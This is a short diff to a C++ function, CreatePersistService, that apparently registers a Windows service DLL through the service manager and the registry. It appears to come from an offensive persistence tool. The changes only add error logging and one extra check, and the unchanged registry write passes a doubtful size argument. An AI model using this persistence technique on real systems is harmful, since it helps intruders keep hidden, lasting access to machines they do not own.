@@ -90,6 +90,7 @@ int CreatePersistService() {
 	);
 
 	if (hSCManager == NULL) {
+		Log("[!] Failed to get handle to scmanager: " + std::to_string(GetLastError()), componentName);
 		return 1;
 	}
 
@@ -111,6 +112,7 @@ int CreatePersistService() {
 	);
 
 	if (hService == NULL) {
+		Log("[!] Failed to create service: " + std::to_string(GetLastError()), componentName);
 		return 2;
 	}
 	
@@ -129,7 +131,7 @@ int CreatePersistService() {
 	);
 
 	if (s != ERROR_SUCCESS) {
-		
+		Log("[!] RegCreateKeyExW failed: " + std::to_string(GetLastError()), componentName);
 		return 3;
 	}
 
@@ -141,6 +143,11 @@ int CreatePersistService() {
 		dllPath,
 		sizeof(LPCSTR)+1
 	);
+
+	if (s != ERROR_SUCCESS) {
+		Log("[!] RegSetKeyValueW failed: " + std::to_string(GetLastError()), componentName);
+		return 3;
+	}
 
 	// optionally set service group
 
